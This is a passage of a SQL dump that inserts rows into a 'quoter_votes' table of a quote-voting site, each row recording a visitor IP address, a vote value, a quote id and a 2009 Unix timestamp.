  (10568,'174.36.207.234','',0,289,1231218070),
  (10569,'174.36.207.234','',0,265,1231218076),
  (10570,'174.36.207.234','',0,144,1231218085),
  (10571,'174.36.207.234','',0,130,1231218094),
  (10572,'174.36.207.234','',0,85,1231218099),
  (10573,'174.36.207.234','',0,84,1231218105),
  (10574,'174.36.207.234','',0,12,1231218111),
  (10575,'174.36.207.234','',0,315,1231218117),
  (10576,'174.36.207.234','',0,221,1231218126),
  (10577,'174.36.207.234','',0,118,1231218135),
  (10578,'174.36.207.234','',0,110,1231218141),
  (10579,'174.36.207.234','',0,74,1231218183),
  (10580,'174.36.207.234','',0,24,1231218188),
  (10581,'174.36.207.234','',0,23,1231218194),
  (10582,'174.36.207.234','',0,308,1231218202),
  (10583,'174.36.207.234','',0,307,1231218214),
  (10584,'174.36.207.234','',0,138,1231218220),
  (10585,'174.36.207.234','',0,100,1231218224),
  (10586,'174.36.207.234','',0,60,1231218231),
  (10587,'174.36.207.234','',0,55,1231218238),
  (10588,'174.36.207.234','',0,236,1231218246),
  (10589,'174.36.207.234','',0,136,1231218252),
  (10590,'174.36.207.234','',0,135,1231218261),
  (10591,'174.36.207.234','',0,73,1231218266),
  (10592,'174.36.207.234','',0,58,1231218274),
  (10593,'174.36.207.234','',0,44,1231218283),
  (10594,'174.36.207.234','',0,253,1231218289),
  (10595,'174.36.207.234','',0,219,1231218294),
  (10596,'174.36.207.234','',0,134,1231218306),
  (10597,'174.36.207.234','',0,291,1231218321),
  (10598,'174.36.207.234','',0,288,1231218332),
  (10599,'174.36.207.234','',0,279,1231218341),
  (10600,'174.36.207.234','',0,274,1231218345),
  (10601,'174.36.207.234','',0,270,1231218352),
  (10602,'174.36.207.234','',0,264,1231218359),
  (10603,'174.36.207.234','',0,263,1231218368),
  (10604,'174.36.207.234','',0,262,1231218373),
  (10605,'174.36.207.234','',0,259,1231218381),
  (10606,'174.36.207.234','',0,254,1231218387),
  (10607,'174.36.207.234','',0,1,1231218398),
  (10608,'174.36.207.234','',0,212,1231218418),
  (10609,'174.36.207.234','',0,173,1231218431),
  (10610,'174.36.207.234','',0,120,1231218436),
  (10611,'174.36.207.234','',0,119,1231218442),
  (10612,'174.36.207.234','',0,109,1231218448),
  (10613,'174.36.207.234','',0,140,1231218456),
  (10614,'174.36.207.234','',0,238,1231218465),
  (10615,'174.36.207.234','',0,93,1231218470),
  (10616,'174.36.207.234','',0,29,1231218476),
  (10617,'174.36.207.234','',0,56,1231218483),
  (10618,'174.36.207.234','',0,21,1231218493),
  (10619,'174.36.207.234','',0,18,1231218503),
  (10620,'72.30.81.151','',0,201,1231218839),
  (10621,'66.249.66.47','',0,325,1231218848),
  (10622,'66.249.66.47','',0,9,1231219220),
  (10623,'64.1.215.165','',0,327,1231220109),
  (10624,'64.1.215.165','',0,156,1231220596),
  (10625,'72.30.81.151','',0,147,1231222238),
  (10626,'66.249.66.47','',0,324,1231222662),
  (10627,'64.1.215.165','',0,322,1231222703),
  (10628,'72.30.81.151','',0,241,1231222868),
  (10629,'66.249.66.47','',0,56,1231223254),
  (10630,'66.249.66.47','',0,60,1231223305),
  (10631,'66.249.66.47','',0,61,1231223364),
  (10632,'81.18.116.69','',0,322,1231223747),
  (10633,'81.18.116.69','',0,320,1231223761),
  (10634,'81.18.116.69','',0,325,1231223770),
  (10635,'81.18.116.69','',0,326,1231223780),
  (10636,'81.18.116.69','',0,327,1231223784),
  (10637,'89.107.82.140','',0,1,1231223796),
  (10638,'89.107.82.140','',0,55,1231223798),
  (10639,'72.30.81.151','',0,231,1231223845),
  (10640,'72.30.81.151','',0,100,1231225030),
  (10641,'92.46.0.203','',0,1,1231225091),
  (10642,'92.46.0.203','',0,55,1231225093),
  (10643,'92.46.0.203','',0,258,1231225109),
  (10644,'66.249.66.47','',0,76,1231225637),
  (10645,'66.249.66.47','',0,69,1231225853),
  (10646,'66.249.66.47','',0,67,1231225926),
  (10647,'72.30.81.151','',0,332,1231226429),
  (10648,'64.1.215.165','',0,205,1231226854),
  (10649,'66.249.66.47','',0,327,1231227260),
  (10650,'66.249.66.47','',0,79,1231227283),
  (10651,'85.140.9.238','',0,320,1231227642),
  (10652,'85.140.9.238','',0,322,1231227662),
  (10653,'85.140.9.238','',0,324,1231227677),
  (10654,'85.140.9.238','',0,325,1231227708),
  (10655,'85.140.9.238','',0,326,1231227743),
  (10656,'85.140.9.238','',0,327,1231227773),
  (10657,'85.140.9.238','',0,328,1231227817),
  (10658,'85.140.9.238','',0,331,1231227850),
  (10659,'85.140.9.238','',0,332,1231227868),
  (10660,'85.140.9.238','',0,333,1231228101),
  (10661,'64.1.215.165','',0,56,1231229866),
  (10662,'89.223.24.167','',0,332,1231230311),
  (10663,'72.30.81.151','',0,310,1231230665),
  (10664,'64.1.215.165','',0,102,1231230845),
  (10665,'72.30.81.151','',0,312,1231230870),
  (10666,'72.30.81.151','',0,235,1231230986),
  (10667,'72.30.81.151','',0,309,1231230990),
  (10668,'72.30.81.151','',0,303,1231230993),
  (10669,'72.30.81.151','',0,311,1231231014),
  (10670,'66.249.66.47','',0,326,1231231085),
  (10671,'72.30.81.151','',0,308,1231231465),
  (10672,'64.1.215.165','',0,93,1231231541),
  (10673,'84.19.181.92','',0,328,1231231605),
  (10674,'66.249.66.47','',0,320,1231231685),
  (10675,'72.30.81.151','',0,304,1231231697),
  (10676,'72.30.81.151','',0,73,1231232785),
  (10677,'72.30.81.151','',0,333,1231234874),
  (10678,'72.30.81.151','',0,77,1231236412),
  (10679,'64.1.215.165','',0,100,1231237553),
  (10680,'91.142.162.226','',0,333,1231237648),
  (10681,'91.142.162.226','',0,328,1231237682),
  (10682,'91.192.217.154','',0,327,1231238216),
  (10683,'66.249.66.47','',0,325,1231238744),
  (10684,'66.249.66.47','',0,243,1231239584),
  (10685,'66.249.66.47','',0,326,1231239792),
  (10686,'217.159.130.58','',0,333,1231241743),
  (10687,'217.159.130.58','',0,328,1231241796),
  (10688,'217.159.130.58','',0,327,1231241834),
  (10689,'217.159.130.58','',0,324,1231241896),
  (10690,'217.159.130.58','',0,322,1231241916),
  (10691,'66.249.66.47','',0,12,1231242325),
  (10692,'217.77.111.87','',0,334,1231242629),
  (10693,'84.19.181.92','',0,173,1231243317),
  (10694,'81.18.116.69','',0,334,1231243817),
  (10695,'72.30.81.151','',0,255,1231244466),
  (10696,'72.30.81.151','',0,221,1231245007),
  (10697,'62.221.49.72','',0,332,1231245555),
  (10698,'62.221.49.72','',0,318,1231245722),
  (10699,'62.221.49.72','',0,299,1231246096),
  (10700,'62.221.49.72','',0,298,1231246121),
  (10701,'72.30.81.151','',0,206,1231246771),
  (10702,'92.113.0.8','',0,234,1231246843),
  (10703,'86.57.246.180','',0,270,1231246859),
  (10704,'86.57.246.180','',0,29,1231247020),
  (10705,'77.247.164.77','',0,296,1231247286),
  (10706,'88.147.174.196','',0,286,1231247575),
  (10707,'217.21.54.116','',0,334,1231247575),
  (10708,'217.21.54.116','',0,328,1231247582),
  (10709,'217.21.54.116','',0,322,1231247598),
  (10710,'217.21.54.116','',0,305,1231247608),
  (10711,'217.21.54.116','',0,304,1231247611),
  (10712,'217.21.54.116','',0,327,1231247684),
  (10713,'217.21.54.116','',0,212,1231247788),
  (10714,'217.21.54.116','',0,173,1231247852),
  (10715,'217.21.54.116','',0,120,1231247874),
  (10716,'217.21.54.116','',0,109,1231247893),
  (10717,'217.21.54.116','',0,93,1231248031),
  (10718,'91.122.16.128','',0,299,1231249092),
  (10719,'91.122.16.128','',0,212,1231249096),
  (10720,'91.122.16.128','',0,119,1231249111),
  (10721,'217.77.111.87','',0,335,1231249478),
  (10722,'79.175.2.41','',0,334,1231249952),
  (10723,'80.250.181.18','',0,334,1231250033),
  (10724,'217.21.54.116','',0,335,1231250066),
  (10725,'193.110.112.218','',0,332,1231250417),
  (10726,'195.26.92.114','',0,298,1231250873),
  (10727,'195.26.92.114','',0,292,1231250952),
  (10728,'72.30.81.151','',0,24,1231251057),
  (10729,'72.30.81.151','',0,242,1231251104),
  (10730,'195.26.92.114','',0,264,1231251177),
  (10731,'64.1.215.165','',0,286,1231252077),
  (10732,'91.211.13.131','',0,215,1231252966),
  (10733,'93.84.36.185','',0,299,1231253954),
  (10734,'93.84.36.185','',0,298,1231254104),
  (10735,'64.1.215.165','',0,89,1231254680),
  (10736,'91.124.29.37','',0,335,1231254728),
  (10737,'91.124.29.37','',0,333,1231254759),
  (10738,'91.124.29.37','',0,336,1231254769),
  (10739,'91.124.29.37','',0,291,1231254795),
  (10740,'79.126.1.79','',0,337,1231254982),
  (10741,'79.126.1.79','',0,334,1231254988),
  (10742,'79.126.1.79','',0,336,1231254990),
  (10743,'79.126.1.79','',0,331,1231254994),
  (10744,'94.253.50.43','',0,336,1231255625),
  (10745,'89.113.75.72','',0,335,1231256412),
  (10746,'95.24.43.250','',0,336,1231256790),
  (10747,'72.30.81.151','',0,136,1231256942),
  (10748,'72.30.81.151','',0,303,1231257653),
  (10749,'72.30.81.151','',0,99,1231259344),
  (10750,'72.30.81.151','',0,88,1231259582),
  (10751,'72.30.81.151','',0,58,1231260270),
  (10752,'64.1.215.165','',0,21,1231260593),
  (10753,'213.160.138.222','',0,338,1231260702),
  (10754,'77.126.229.21','',0,338,1231260706),
  (10755,'195.239.127.106','',0,338,1231260758),
  (10756,'82.207.125.180','',0,325,1231260940),
  (10757,'94.181.134.132','',0,338,1231260957),
  (10758,'72.30.81.151','',0,234,1231260966),
  (10759,'64.1.215.165','',0,96,1231260968),
  (10760,'72.30.81.151','',0,230,1231261076),
  (10761,'72.30.81.151','',0,255,1231261189),
  (10762,'81.94.19.78','',0,338,1231261294),
  (10763,'95.72.77.28','',0,338,1231261456),
  (10764,'195.2.233.249','',0,338,1231261888),
  (10765,'64.1.215.165','',0,128,1231261888),
  (10766,'93.85.35.40','',0,299,1231262508),
  (10767,'93.85.35.40','',0,29,1231262540),
  (10768,'93.185.182.24','',0,335,1231263510),
  (10769,'93.185.182.24','',0,334,1231263554),
  (10770,'81.25.38.67','',0,326,1231263771),
  (10771,'64.1.215.165','',0,102,1231264464),
  (10772,'156.17.237.13','',0,338,1231265474),
  (10773,'94.76.213.91','',0,233,1231267555),
  (10774,'94.76.213.91','',0,234,1231267569),
  (10775,'94.76.213.91','',0,235,1231267575),
  (10776,'94.76.213.91','',0,236,1231267581),
  (10777,'94.76.213.91','',0,238,1231267590),
  (10778,'94.76.213.91','',0,240,1231267605),
  (10779,'94.76.213.91','',0,241,1231267611),
  (10780,'94.76.213.91','',0,242,1231267619),
  (10781,'94.76.213.91','',0,243,1231267630),
  (10782,'94.76.213.91','',0,245,1231267639),
  (10783,'94.76.213.91','',0,246,1231267663),
  (10784,'94.76.213.91','',0,247,1231267674),
  (10785,'94.76.213.91','',0,248,1231267680),
  (10786,'94.76.213.91','',0,249,1231267693),
  (10787,'94.76.213.91','',0,250,1231267703),
  (10788,'94.76.213.91','',0,251,1231267709),
  (10789,'94.76.213.91','',0,253,1231267717),
  (10790,'94.76.213.91','',0,254,1231267728),
  (10791,'94.76.213.91','',0,255,1231267733),
  (10792,'94.76.213.91','',0,256,1231267739),
  (10793,'94.76.213.91','',0,184,1231267746),
  (10794,'94.76.213.91','',0,185,1231267757),
  (10795,'94.76.213.91','',0,189,1231267763),
  (10796,'94.76.213.91','',0,190,1231267771),
  (10797,'94.76.213.91','',0,195,1231267789),
  (10798,'94.76.213.91','',0,197,1231267800),
  (10799,'94.76.213.91','',0,199,1231267807),
  (10800,'94.76.213.91','',0,201,1231267817),
  (10801,'94.76.213.91','',0,202,1231267824),
  (10802,'94.76.213.91','',0,203,1231267835),
  (10803,'94.76.213.91','',0,204,1231267846),
  (10804,'94.76.213.91','',0,205,1231267850),
  (10805,'94.76.213.91','',0,206,1231267856),
  (10806,'94.76.213.91','',0,207,1231267865),
  (10807,'94.76.213.91','',0,208,1231267871),
  (10808,'94.76.213.91','',0,212,1231267879),
  (10809,'94.76.213.91','',0,213,1231267884),
  (10810,'94.76.213.91','',0,214,1231267894),
  (10811,'94.76.213.91','',0,215,1231267905),
  (10812,'94.76.213.91','',0,216,1231267914),
  (10813,'94.76.213.91','',0,218,1231267925),
  (10814,'94.76.213.91','',0,219,1231267941),
  (10815,'94.76.213.91','',0,220,1231267948),
  (10816,'94.76.213.91','',0,221,1231267955),
  (10817,'94.76.213.91','',0,222,1231267968),
  (10818,'94.76.213.91','',0,223,1231267975),
  (10819,'94.76.213.91','',0,227,1231267982),
  (10820,'94.76.213.91','',0,229,1231267998),
  (10821,'94.76.213.91','',0,230,1231268005),
  (10822,'94.76.213.91','',0,231,1231268011),
  (10823,'94.76.213.91','',0,145,1231268016),
  (10824,'94.76.213.91','',0,146,1231268021),
  (10825,'94.76.213.91','',0,147,1231268033),
  (10826,'94.76.213.91','',0,152,1231268041),
  (10827,'94.76.213.91','',0,154,1231268045),
  (10828,'94.76.213.91','',0,155,1231268050),
  (10829,'94.76.213.91','',0,156,1231268059),
  (10830,'94.76.213.91','',0,157,1231268065),
  (10831,'94.76.213.91','',0,159,1231268070),
  (10832,'94.76.213.91','',0,161,1231268077),
  (10833,'94.76.213.91','',0,163,1231268087),
  (10834,'94.76.213.91','',0,164,1231268094),
  (10835,'94.76.213.91','',0,165,1231268099),
  (10836,'94.76.213.91','',0,172,1231268106),
  (10837,'94.76.213.91','',0,173,1231268111),
  (10838,'94.76.213.91','',0,175,1231268123),
  (10839,'94.76.213.91','',0,176,1231268129),
  (10840,'94.76.213.91','',0,177,1231268138),
  (10841,'94.76.213.91','',0,178,1231268146),
  (10842,'94.76.213.91','',0,183,1231268160),
  (10843,'94.76.213.91','',0,106,1231268169),
  (10844,'94.76.213.91','',0,107,1231268181),
  (10845,'94.76.213.91','',0,108,1231268190),
  (10846,'94.76.213.91','',0,109,1231268200),
  (10847,'94.76.213.91','',0,110,1231268209),
  (10848,'94.76.213.91','',0,111,1231268219),
  (10849,'94.76.213.91','',0,113,1231268228),
  (10850,'94.76.213.91','',0,114,1231268234),
  (10851,'94.76.213.91','',0,115,1231268242),
  (10852,'94.76.213.91','',0,118,1231268248),
  (10853,'94.76.213.91','',0,119,1231268272),
  (10854,'94.76.213.91','',0,120,1231268285),
  (10855,'94.76.213.91','',0,122,1231268296),
  (10856,'94.76.213.91','',0,124,1231268304),
  (10857,'94.76.213.91','',0,125,1231268310),
  (10858,'94.76.213.91','',0,128,1231268313),
  (10859,'94.76.213.91','',0,129,1231268318),
  (10860,'94.76.213.91','',0,130,1231268324),
  (10861,'94.76.213.91','',0,133,1231268332),
  (10862,'94.76.213.91','',0,134,1231268337),
  (10863,'94.76.213.91','',0,135,1231268348),
  (10864,'94.76.213.91','',0,136,1231268352),
  (10865,'94.76.213.91','',0,137,1231268363),
  (10866,'94.76.213.91','',0,138,1231268368),
  (10867,'94.76.213.91','',0,139,1231268379),
  (10868,'94.76.213.91','',0,140,1231268388),
  (10869,'72.30.81.151','',0,178,1231268394),
  (10870,'94.76.213.91','',0,141,1231268397),
  (10871,'94.76.213.91','',0,142,1231268407),
  (10872,'94.76.213.91','',0,143,1231268430),
  (10873,'94.76.213.91','',0,144,1231268444),
  (10874,'94.76.213.91','',0,81,1231268450),
  (10875,'94.76.213.91','',0,83,1231268462),
  (10876,'94.76.213.91','',0,84,1231268469),
  (10877,'94.76.213.91','',0,85,1231268477),
  (10878,'94.76.213.91','',0,86,1231268481),
  (10879,'94.76.213.91','',0,87,1231268492),
  (10880,'94.76.213.91','',0,88,1231268497),
  (10881,'94.76.213.91','',0,89,1231268505),
  (10882,'94.76.213.91','',0,90,1231268510),
  (10883,'94.76.213.91','',0,93,1231268520),
  (10884,'94.76.213.91','',0,94,1231268529),
  (10885,'94.76.213.91','',0,95,1231268533),
  (10886,'94.76.213.91','',0,96,1231268539),
  (10887,'94.76.213.91','',0,98,1231268542),
  (10888,'94.76.213.91','',0,99,1231268547),
  (10889,'94.76.213.91','',0,100,1231268557),
  (10890,'94.76.213.91','',0,102,1231268565),
  (10891,'94.76.213.91','',0,103,1231268569),
  (10892,'94.76.213.91','',0,104,1231268574),
  (10893,'94.76.213.91','',0,105,1231268584),
  (10894,'94.76.213.91','',0,25,1231268588),
  (10895,'94.76.213.91','',0,29,1231268593),
  (10896,'94.76.213.91','',0,30,1231268603),
  (10897,'94.76.213.91','',0,38,1231268613),
  (10898,'94.76.213.91','',0,39,1231268623),
  (10899,'94.76.213.91','',0,44,1231268628),
  (10900,'94.76.213.91','',0,48,1231268634),
  (10901,'94.76.213.91','',0,50,1231268638),
  (10902,'95.32.77.172','',0,299,1231268781),
  (10903,'92.101.244.18','',0,338,1231268806),
  (10904,'89.250.2.228','',0,328,1231269032),
  (10905,'87.237.118.21','',0,335,1231269489),
  (10906,'64.1.215.165','',0,288,1231269841),
  (10907,'72.30.81.151','',0,220,1231272724),
  (10908,'89.113.75.72','',0,338,1231272968),
  (10909,'64.1.215.165','',0,4,1231274464),
  (10910,'217.197.1.223','',0,339,1231275001),
  (10911,'94.51.146.8','',0,339,1231275116),
  (10912,'64.1.215.165','',0,104,1231275257),
  (10913,'72.30.81.151','',0,304,1231275590),
  (10914,'72.30.81.151','',0,308,1231275975),
  (10915,'93.185.183.24','',0,339,1231276997),
  (10916,'94.51.146.8','',0,336,1231277064),
  (10917,'92.124.163.50','',0,286,1231278475),
  (10918,'78.37.127.77','',0,299,1231279334),
  (10919,'217.197.1.223','',0,337,1231279705),
  (10920,'217.197.1.223','',0,331,1231279705),
  (10921,'64.1.215.165','',0,21,1231279858),
  (10922,'77.88.30.246','',0,327,1231281034),
  (10923,'77.88.30.246','',0,326,1231281061),
  (10924,'208.68.173.82','',0,336,1231281101),
  (10925,'77.88.30.246','',0,333,1231281114),
  (10926,'77.88.30.246','',0,328,1231281136),
  (10927,'77.88.30.246','',0,332,1231281198),
  (10928,'77.88.30.246','',0,331,1231281346),
  (10929,'208.68.173.82','',0,340,1231281457),
  (10930,'208.68.173.82','',0,327,1231281532),
  (10931,'208.68.173.82','',0,328,1231281557),
  (10932,'208.68.173.82','',0,322,1231281558),
  (10933,'208.68.173.82','',0,318,1231281584),
  (10934,'208.68.173.82','',0,333,1231281615),
  (10935,'208.68.173.82','',0,320,1231281630),
  (10936,'194.187.50.162','',0,337,1231283011),
  (10937,'72.30.81.151','',0,234,1231283969),
  (10938,'72.30.81.151','',0,245,1231284707),
  (10939,'92.244.233.170','',0,327,1231286517),
  (10940,'72.30.81.151','',0,111,1231288381),
  (10941,'193.33.49.18','',0,339,1231288646),
  (10942,'89.251.107.24','',0,322,1231288860),
  (10943,'89.251.107.24','',0,172,1231288876),
  (10944,'89.251.107.24','',0,93,1231288970),
  (10945,'95.52.2.189','',0,337,1231289324),
  (10946,'95.52.2.189','',0,331,1231289594),
  (10947,'72.30.81.151','',0,305,1231290834),
  (10948,'89.191.241.225','',0,336,1231292013),
  (10949,'89.113.75.72','',0,339,1231292687),
  (10950,'78.24.225.17','',0,1,1231299622),
  (10951,'78.24.225.17','',0,212,1231299630),
  (10952,'72.30.65.40','',0,316,1231301054),
  (10953,'72.30.65.40','',0,317,1231301067),
  (10954,'72.30.65.40','',0,318,1231301882),
  (10955,'72.30.65.40','',0,213,1231302797),
  (10956,'84.19.181.92','',0,328,1231303809),
  (10957,'72.30.65.40','',0,305,1231304305),
  (10958,'72.30.65.40','',0,207,1231304581),
  (10959,'72.30.65.40','',0,317,1231309933),
  (10960,'72.30.65.40','',0,309,1231310803),
  (10961,'195.189.143.60','',0,336,1231311493),
  (10962,'80.255.155.30','',0,264,1231312626),
  (10963,'72.30.65.40','',0,334,1231312996),
  (10964,'72.30.65.40','',0,338,1231313035),
  (10965,'72.30.65.40','',0,340,1231313039),
  (10966,'72.30.65.40','',0,336,1231313043),
  (10967,'72.30.65.40','',0,337,1231313074),
  (10968,'72.30.65.40','',0,339,1231313107),
  (10969,'72.30.65.40','',0,335,1231313603),
  (10970,'84.19.181.92','',0,336,1231314347),
  (10971,'64.1.215.165','',0,54,1231314473),
  (10972,'81.25.38.67','',0,339,1231315721),
  (10973,'195.239.127.106','',0,338,1231316437),
  (10974,'72.30.65.40','',0,74,1231316546),
  (10975,'92.50.248.42','',0,336,1231316818),
  (10976,'92.50.248.42','',0,337,1231316854),
  (10977,'92.50.248.42','',0,335,1231316881),
  (10978,'92.50.248.42','',0,333,1231316907),
  (10979,'92.50.248.42','',0,331,1231316950),
  (10980,'92.50.248.42','',0,328,1231316980),
  (10981,'64.1.215.165','',0,62,1231317215),
  (10982,'72.30.65.40','',0,312,1231317246),
  (10983,'72.30.65.40','',0,313,1231317388),
  (10984,'72.30.65.40','',0,315,1231317392),
  (10985,'92.50.248.42','',0,326,1231317431),
  (10986,'64.1.215.165','',0,322,1231317645),
  (10987,'72.30.65.40','',0,89,1231317784),
  (10988,'213.145.154.57','',0,339,1231317991),
  (10989,'64.1.215.165','',0,108,1231318201),
  (10990,'213.145.154.57','',0,335,1231318245),
  (10991,'213.145.154.57','',0,334,1231318330),
  (10992,'213.145.154.57','',0,333,1231318367),
  (10993,'213.145.154.57','',0,326,1231318424),
  (10994,'72.30.65.40','',0,138,1231318939),
  (10995,'64.1.215.165','',0,207,1231319076),
  (10996,'81.94.19.78','',0,337,1231319582),
  (10997,'81.94.19.78','',0,336,1231319594),
  (10998,'72.30.65.40','',0,139,1231322209),
  (10999,'79.171.124.102','',0,342,1231322781),
  (11000,'93.125.23.119','',0,342,1231323640);
COMMIT;

#
# Data for the `quoter_votes` table  (LIMIT 11000,500)
#

INSERT INTO `quoter_votes` (`id`, `ip`, `useragent`, `value`, `quote_id`, `created`) VALUES 
  (11001,'93.125.23.119','',0,336,1231323716),
  (11002,'72.30.65.40','',0,73,1231324916),
  (11003,'94.178.75.113','',0,336,1231325197),
  (11004,'91.202.197.79','',0,342,1231325581),
  (11005,'91.202.197.79','',0,339,1231325641),
  (11006,'91.202.197.79','',0,336,1231325668),
  (11007,'212.96.113.139','',0,341,1231325884),
  (11008,'212.96.113.139','',0,29,1231325963),
  (11009,'212.96.113.139','',0,336,1231326024),
  (11010,'72.30.65.40','',0,87,1231326144),
  (11011,'91.122.21.77','',0,341,1231328238),
  (11012,'217.159.130.58','',0,335,1231328520),
  (11013,'66.249.66.47','',0,238,1231328683),
  (11014,'64.1.215.165','',0,44,1231328729),
  (11015,'91.210.20.2','',0,336,1231328807),
  (11016,'91.210.20.2','',0,333,1231328820),
  (11017,'64.1.215.165','',0,109,1231328944),
  (11018,'72.30.65.40','',0,230,1231329030),
  (11019,'91.210.20.2','',0,291,1231329478),
  (11020,'92.242.14.238','',0,339,1231329509),
  (11021,'92.242.14.238','',0,328,1231329543),
  (11022,'92.242.14.238','',0,326,1231329580),
  (11023,'92.242.14.238','',0,305,1231329805),
  (11024,'64.1.215.165','',0,304,1231330085),
  (11025,'72.30.65.40','',0,240,1231330103),
  (11026,'92.242.14.238','',0,238,1231330239),
  (11027,'92.242.14.238','',0,1,1231330478),
  (11028,'92.242.14.238','',0,29,1231330562),
  (11029,'72.30.65.40','',0,88,1231330564),
  (11030,'92.242.14.238','',0,56,1231330580),
  (11031,'92.242.14.238','',0,18,1231330597),
  (11032,'92.242.14.238','',0,120,1231330611),
  (11033,'92.242.14.238','',0,74,1231330776),
  (11034,'66.249.66.47','',0,62,1231332165),
  (11035,'79.171.124.57','',0,336,1231332520),
  (11036,'217.159.130.58','',0,341,1231333435),
  (11037,'217.159.130.58','',0,339,1231333469),
  (11038,'217.159.130.58','',0,334,1231333555),
  (11039,'88.204.16.169','',0,340,1231334827),
  (11040,'72.30.65.40','',0,333,1231335293),
  (11041,'72.30.65.40','',0,144,1231337303),
  (11042,'156.17.237.13','',0,342,1231337647),
  (11043,'64.1.215.165','',0,130,1231340952),
  (11044,'72.30.65.40','',0,111,1231341599),
  (11045,'72.30.65.40','',0,219,1231342284),
  (11046,'64.1.215.165','',0,265,1231342420),
  (11047,'64.1.215.165','',0,67,1231342469),
  (11048,'64.1.215.165','',0,283,1231342914),
  (11049,'64.1.215.165','',0,20,1231343817),
  (11050,'72.30.65.40','',0,146,1231343870),
  (11051,'72.30.65.40','',0,184,1231344342),
  (11052,'72.30.65.40','',0,118,1231344467),
  (11053,'72.30.65.40','',0,205,1231344556),
  (11054,'92.124.49.171','',0,120,1231345670),
  (11055,'217.197.1.223','',0,339,1231348127),
  (11056,'94.51.137.163','',0,339,1231348184),
  (11057,'72.30.65.40','',0,89,1231350070),
  (11058,'64.1.215.165','',0,79,1231350130),
  (11059,'72.30.65.40','',0,44,1231350671),
  (11060,'64.1.215.165','',0,86,1231352003),
  (11061,'91.78.49.240','',0,332,1231352556),
  (11062,'72.30.65.40','',0,70,1231352572),
  (11063,'77.66.156.227','',0,328,1231352638),
  (11064,'194.6.197.42','',0,305,1231352976),
  (11065,'194.6.197.42','',0,341,1231353416),
  (11066,'64.1.215.165','',0,238,1231353636),
  (11067,'64.1.215.165','',0,114,1231354549),
  (11068,'79.175.2.41','',0,338,1231356158),
  (11069,'64.1.215.165','',0,71,1231356432),
  (11070,'64.1.215.165','',0,221,1231356516),
  (11071,'64.1.215.165','',0,12,1231357095),
  (11072,'64.1.215.165','',0,147,1231358224),
  (11073,'64.1.215.165','',0,202,1231359913),
  (11074,'85.140.65.228','',0,339,1231360740),
  (11075,'85.140.65.228','',0,335,1231360779),
  (11076,'85.140.65.228','',0,331,1231360880),
  (11077,'85.140.65.228','',0,322,1231361081),
  (11078,'85.140.65.228','',0,262,1231361372),
  (11079,'72.30.65.40','',0,246,1231362334),
  (11080,'72.30.65.40','',0,256,1231362472),
  (11081,'78.37.124.54','',0,212,1231363058),
  (11082,'78.37.124.54','',0,299,1231363070),
  (11083,'85.140.65.228','',0,102,1231363179),
  (11084,'85.140.65.228','',0,95,1231363302),
  (11085,'77.88.30.246','',0,340,1231363594),
  (11086,'77.88.30.246','',0,337,1231363608),
  (11087,'77.88.30.246','',0,335,1231363629),
  (11088,'77.88.30.246','',0,338,1231363714),
  (11089,'77.88.30.246','',0,339,1231363724),
  (11090,'77.88.30.246','',0,334,1231363759),
  (11091,'217.197.1.223','',0,322,1231363980),
  (11092,'217.197.1.223','',0,339,1231363992),
  (11093,'94.51.137.163','',0,339,1231364032),
  (11094,'217.197.1.223','',0,341,1231364155),
  (11095,'217.197.1.223','',0,340,1231364219),
  (11096,'194.187.50.162','',0,342,1231364480),
  (11097,'194.187.50.162','',0,340,1231364513),
  (11098,'72.30.65.40','',0,258,1231364814),
  (11099,'72.30.65.40','',0,243,1231365647),
  (11100,'72.30.65.40','',0,337,1231365731),
  (11101,'72.30.65.40','',0,12,1231365777),
  (11102,'87.119.230.149','',0,259,1231366438),
  (11103,'87.119.230.149','',0,258,1231366563),
  (11104,'87.119.230.149','',0,111,1231366760),
  (11105,'64.1.215.165','',0,290,1231367620),
  (11106,'72.30.65.40','',0,100,1231370046),
  (11107,'72.30.65.40','',0,259,1231371223),
  (11108,'72.30.65.40','',0,125,1231372608),
  (11109,'72.30.65.40','',0,74,1231373039),
  (11110,'64.1.215.165','',0,87,1231374052),
  (11111,'72.30.65.40','',0,23,1231375195),
  (11112,'64.1.215.165','',0,54,1231376759),
  (11113,'92.124.176.214','',0,286,1231377059),
  (11114,'72.30.65.40','',0,133,1231378711),
  (11115,'72.30.65.40','',0,335,1231378784),
  (11116,'72.30.65.40','',0,264,1231380010),
  (11117,'80.243.71.189','',0,1,1231381033),
  (11118,'80.243.71.189','',0,55,1231381036),
  (11119,'80.243.71.189','',0,212,1231381041),
  (11120,'72.30.65.40','',0,315,1231382608),
  (11121,'80.243.71.189','',0,334,1231383646),
  (11122,'64.1.215.165','',0,75,1231383722),
  (11123,'64.1.215.165','',0,247,1231385198),
  (11124,'66.249.66.47','',0,342,1231385448),
  (11125,'193.93.218.64','',0,341,1231385917),
  (11126,'64.1.215.165','',0,142,1231386085),
  (11127,'91.203.96.19','',0,342,1231386216),
  (11128,'64.1.215.165','',0,288,1231386437),
  (11129,'89.19.169.144','',0,342,1231386643),
  (11130,'64.1.215.165','',0,304,1231387528),
  (11131,'64.1.215.165','',0,100,1231387562),
  (11132,'72.30.65.40','',0,62,1231387774),
  (11133,'72.30.65.40','',0,219,1231387988),
  (11134,'72.30.65.40','',0,213,1231389319),
  (11135,'95.56.1.134','',0,1,1231390040),
  (11136,'95.56.1.134','',0,55,1231390042),
  (11137,'95.56.1.134','',0,258,1231390055),
  (11138,'72.30.65.40','',0,262,1231390272),
  (11139,'64.1.215.165','',0,165,1231391310),
  (11140,'64.1.215.165','',0,184,1231391374),
  (11141,'72.30.65.40','',0,297,1231392514),
  (11142,'72.30.65.40','',0,242,1231392726),
  (11143,'81.200.211.90','',0,340,1231393951),
  (11144,'81.200.211.90','',0,311,1231393957),
  (11145,'81.200.211.90','',0,310,1231393966),
  (11146,'81.200.211.90','',0,296,1231394029),
  (11147,'81.200.211.90','',0,298,1231394030),
  (11148,'81.200.211.90','',0,214,1231394116),
  (11149,'81.200.211.90','',0,202,1231394125),
  (11150,'81.200.211.90','',0,190,1231394129),
  (11151,'81.200.211.90','',0,102,1231394152),
  (11152,'64.1.215.165','',0,201,1231394420),
  (11153,'64.1.215.165','',0,23,1231394448),
  (11154,'80.243.71.189','',0,335,1231395261),
  (11155,'64.1.215.165','',0,76,1231395576),
  (11156,'64.1.215.165','',0,141,1231398993),
  (11157,'72.30.65.40','',0,240,1231399449),
  (11158,'72.30.65.40','',0,341,1231399575),
  (11159,'64.1.215.165','',0,216,1231400376),
  (11160,'64.1.215.165','',0,79,1231401616),
  (11161,'92.242.6.60','',0,207,1231401685),
  (11162,'72.30.65.40','',0,163,1231402268),
  (11163,'78.24.224.53','',0,1,1231403275),
